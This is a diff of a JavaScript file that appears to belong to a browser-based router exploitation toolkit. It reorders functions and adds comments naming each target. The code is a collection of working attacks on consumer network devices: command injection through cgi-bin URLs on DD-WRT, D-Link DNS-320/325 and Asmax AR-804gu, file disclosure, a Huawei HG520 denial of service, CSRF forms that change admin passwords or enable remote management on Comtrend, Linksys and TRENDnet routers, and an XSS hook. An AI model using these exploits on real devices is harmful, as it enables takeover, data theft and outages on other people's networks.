@@ -1886,34 +1886,20 @@ function changeDNS(server, ip) {
 	},5000);
 }
 /* end pdp */
+
+// D-Link DSL-G604T change DNS servers
 function dlidns() {
 	dns=prompt("DNS server:");
 	changeDNS(dns);
 }
 
+// DD-WRT remote comand execution
 function ddwrtexec() {
 	cmd=prompt("Command:");
 	if (cmd==null || cmd==""){}else{
 		document.location="http://192.168.1.1/cgi-bin/;"+cmd;
 	}
 }
-
-function dns320() {
-	cmd=prompt("Command:");
-	if (cmd==null || cmd==""){}else{
-		document.location=" http://192.168.0.1/cgi-bin/system_mgr.cgi?cmd=cgi_sms_test&command1="+cmd;
-	}
-}
-
-function dns320r() {
-	ip=prompt("IP:");
-	cmd=prompt("Command:");
-	if (ip==null || ip==""){}else{
-		document.location=" http://"+ip+"/cgi-bin/system_mgr.cgi?cmd=cgi_sms_test&command1="+cmd;
-	}
-}
-
-
 function ddwrtexecr() {
 	ip=prompt("IP:");
 	cmd=prompt("Command:");
@@ -1922,12 +1908,30 @@ function ddwrtexecr() {
 	}
 }
 
+// D-Link DNS-320 DNS-325 command execution
+function dns320() { // Not used, this is a NAS, not a router, it doesn't have a default IP
+	cmd=prompt("Command:");
+	if (cmd==null || cmd==""){}else{
+		document.location=" http://192.168.0.1/cgi-bin/system_mgr.cgi?cmd=cgi_sms_test&command1="+cmd;
+	}
+}
+function dns320r() {
+	ip=prompt("IP:");
+	cmd=prompt("Command:");
+	if (ip==null || ip==""){}else{
+		document.location=" http://"+ip+"/cgi-bin/system_mgr.cgi?cmd=cgi_sms_test&command1="+cmd;
+	}
+}
+
+// Huawei HG520 HTTP auth denial of service
 function huados() {
 	ip=prompt("IP:");
 	if (ip==null || ip==""){}else{
 		document.location="http://SHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAA:SHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKA@"+ip;
 }
 }
+
+// Asmax AR-804gu command execution
 function asmrce() {
 	ip=prompt("IP:");
 	cmd=prompt("Command:");
@@ -1935,6 +1939,8 @@ function asmrce() {
 		document.location="http://"+ip+"/cgi-bin/script?system%20"+cmd;
 	}
 }
+
+// Asmax AR-804gu file disclosure
 function asmfile() {
 	ip=prompt("IP:");
 	cmd=prompt("File:");
@@ -1943,6 +1949,7 @@ function asmfile() {
 	}
 }
 
+// Comtrend CT-5367 Change passwords
 function comtrendpass() {
 	pass=prompt("New password:");
 	document.comtrendpass.sptPassword.value=pass;
@@ -1953,7 +1960,6 @@ function comtrendpass() {
 		document.comtrendpass.submit();
 	}
 }
-
 function comtrendpassr() {
 	ip=prompt("IP:");
 	pass=prompt("New password:");
@@ -1965,6 +1971,8 @@ function comtrendpassr() {
 		document.comtrendpass.submit();
 	}
 }
+
+// Linksys EA2700 WRT310Nv2 Password Change Insufficient Authentication CSRF
 function ea2700passr() {
 	ip=prompt("IP:");
 	xss=prompt("New password:");
@@ -1976,6 +1984,7 @@ function ea2700passr() {
 	}
 }
 
+// TRENDnet TEW 812DRU CSRF Change Admin Credentials
 function trendCSRF() {
 	ip=prompt("IP:");
 	document.trendCSRF.action="http://"+ip+"/setSysAdm.cgi";
@@ -1983,6 +1992,8 @@ function trendCSRF() {
 		document.trendCSRF.submit();
 	}
 }
+
+// TRENDnet TEW 812DRU CSRF Enable Remote Management
 function trendCSRF2() {
 	ip=prompt("IP:");
 	document.trendCSRF2.action="http://"+ip+"/uapply.cgi";
@@ -1991,7 +2002,7 @@ function trendCSRF2() {
 	}
 }
 
-
+// Linksys EA2700 XSS Vulnerability apply.cgi
 function ea2700xssr() {
 	ip=prompt("IP:");
 	xss=prompt("XSS:");
